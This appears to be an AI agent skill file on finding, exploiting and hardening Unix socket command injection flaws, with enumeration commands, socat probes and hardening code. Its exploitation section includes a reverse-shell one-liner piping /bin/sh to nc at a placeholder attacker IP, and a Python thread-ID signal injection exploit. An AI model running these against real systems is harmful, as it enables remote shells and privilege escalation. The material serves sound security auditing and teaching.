---
name: socket-command-injection
description: Identify, test, and exploit socket command injection vulnerabilities in Unix socket-based services. Use this skill whenever you need to audit Unix sockets for command injection flaws, analyze socket-based privilege escalation vectors, or harden socket services against injection attacks. Trigger this skill for any task involving Unix socket security, socket vulnerability assessment, or socket-based privilege escalation research.
---

# Socket Command Injection Security Skill

A skill for identifying, testing, and mitigating socket command injection vulnerabilities in Unix socket-based services.

## When to Use This Skill

Use this skill when:
- Auditing Unix socket services for security vulnerabilities
- Testing for command injection via socket input
- Analyzing socket-based privilege escalation vectors
- Hardening socket services against injection attacks
- Investigating socket-related security incidents
- CTF challenges involving socket exploitation

## Understanding Socket Command Injection

Socket command injection occurs when a service accepts untrusted input through a Unix socket and executes it without proper validation. This is particularly dangerous when:
- The socket is owned by a privileged user (root)
- Input is passed directly to `os.system()`, `exec()`, or similar functions
- The socket permissions allow unprivileged users to connect

## Detection and Analysis

### Step 1: Enumerate Unix Sockets

First, identify all Unix sockets on the system:

```bash
# List all Unix sockets
netstat -a -p --unix | grep LISTENING

# Alternative with ss
ss -x -l -p

# Find socket files
find /tmp /var/run /run -type s 2>/dev/null

# Check socket permissions
ls -la /tmp/*.s /var/run/*.sock 2>/dev/null
```

### Step 2: Analyze Socket Ownership and Permissions

```bash
# Check who owns the socket and who can connect
ls -la /path/to/socket

# Check if socket is world-writable
stat -c '%a %U:%G %n' /path/to/socket
```

**Red flags:**
- Socket owned by root but world-writable (permissions 666 or 777)
- Socket in world-writable directory (like `/tmp`)
- Socket accepting connections from unprivileged users

### Step 3: Probe for Command Injection

Use the `socket-probe.sh` script to test for injection:

```bash
./scripts/socket-probe.sh /path/to/socket
```

Or manually test with socat:

```bash
# Basic command injection test
echo "id" | socat - UNIX-CLIENT:/path/to/socket

# More aggressive test
echo "whoami; id; uname -a" | socat - UNIX-CLIENT:/path/to/socket

# Test with different delimiters
echo -e "id\nwhoami" | socat - UNIX-CLIENT:/path/to/socket
```

## Exploitation Patterns

### Pattern 1: Direct Command Execution

When a socket service executes received data directly:

```python
# Vulnerable pattern to look for
os.system(datagram)
exec(datagram)
subprocess.call(datagram, shell=True)
```

**Exploitation:**
```bash
# Simple command execution
echo "id" | socat - UNIX-CLIENT:/path/to/socket

# Reverse shell
echo "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> <PORT> > /tmp/f" | socat - UNIX-CLIENT:/path/to/socket
```

### Pattern 2: Thread ID Signal Injection

Some services use thread IDs from unprivileged clients to trigger privileged operations:

```python
# Vulnerable pattern
import socket, struct, os, threading

# Service accepts TID from client and signals it
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/path/to/socket")
tid = struct.unpack('<L', s.recv(4))[0]
os.kill(tid, signal)  # Privileged signal sent to client-controlled TID
```

**Exploitation:**
```python
import socket, struct, os, threading, time

# Create a thread we control
th = threading.Thread(target=time.sleep, args=(600,))
th.start()
tid = th.native_id

# Send our TID to the privileged service
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/path/to/socket")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync

# Trigger the privileged handler
os.kill(tid, 4)  # SIGILL or other signal
```

### Pattern 3: Socket Permission Escalation

When socket permissions are misconfigured:

```bash
# Check if socket is world-writable
ls -la /path/to/socket

# If world-writable, try to connect and inject
socat - UNIX-CLIENT:/path/to/socket
```

## Hardening Recommendations

### 1. Socket Permissions

```bash
# Restrict socket permissions
chmod 600 /path/to/socket
chown root:root /path/to/socket

# Use a non-world-writable directory
mkdir -p /var/run/secure-sockets
chmod 750 /var/run/secure-sockets
```

### 2. Input Validation

```python
# Instead of:
os.system(datagram)

# Use:
import shlex
import subprocess

# Whitelist allowed commands
ALLOWED_COMMANDS = ['status', 'version', 'health']

if datagram.decode() in ALLOWED_COMMANDS:
    subprocess.run([datagram.decode()], capture_output=True)
else:
    raise ValueError("Command not allowed")
```

### 3. Authentication and Authorization

```python
# Implement socket authentication
import socket
import os

def check_credentials(conn):
    # Get peer credentials
    peercred = conn.getsockopt(socket.SOL_SOCKET, socket.SO_PEERCRED, 12)
    uid = struct.unpack('i', peercred[:4])[0]
    
    # Only allow root or specific users
    if uid not in [0, 1000]:
        conn.close()
        return False
    return True
```

### 4. Avoid Shell Execution

```python
# Bad:
os.system(user_input)

# Good:
import subprocess

# Use argument lists, not shell=True
subprocess.run(['command', 'arg1', 'arg2'], capture_output=True)
```

## Testing Checklist

Use the `socket-hardening-check.sh` script to audit socket services:

```bash
./scripts/socket-hardening-check.sh /path/to/socket
```

Manual checklist:
- [ ] Socket is not world-writable
- [ ] Socket is in a secure directory
- [ ] Input is validated before execution
- [ ] No shell=True in subprocess calls
- [ ] Authentication is required
- [ ] Privileged operations are decoupled from client input
- [ ] Thread IDs from clients are not used for privileged operations
- [ ] Signals are not sent to client-controlled TIDs

## Common Vulnerable Patterns

| Pattern | Risk | Mitigation |
|---------|------|------------|
| `os.system(socket_input)` | Critical | Use subprocess with argument lists |
| `exec(socket_input)` | Critical | Never execute untrusted input |
| `subprocess.call(input, shell=True)` | Critical | Remove shell=True |
| World-writable socket | High | Restrict permissions to 600 |
| Socket in /tmp | Medium | Use /var/run or private directory |
| TID from client for signals | High | Validate TID ownership |

## References

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
- [Unix Domain Socket Security](https://man7.org/linux/man-pages/man7/unix.7.html)
- [Socat Manual](https://linux.die.net/man/1/socat)

## Quick Start

```bash
# 1. Find sockets
netstat -a -p --unix | grep LISTENING

# 2. Test for injection
echo "id" | socat - UNIX-CLIENT:/path/to/socket

# 3. Run hardening check
./scripts/socket-hardening-check.sh /path/to/socket
```

## Notes

- Always have authorization before testing socket services
- Socket command injection is rare in production but common in CTFs
- Focus on socket permissions and input validation for hardening
- Thread ID injection is a sophisticated attack vector requiring careful analysis
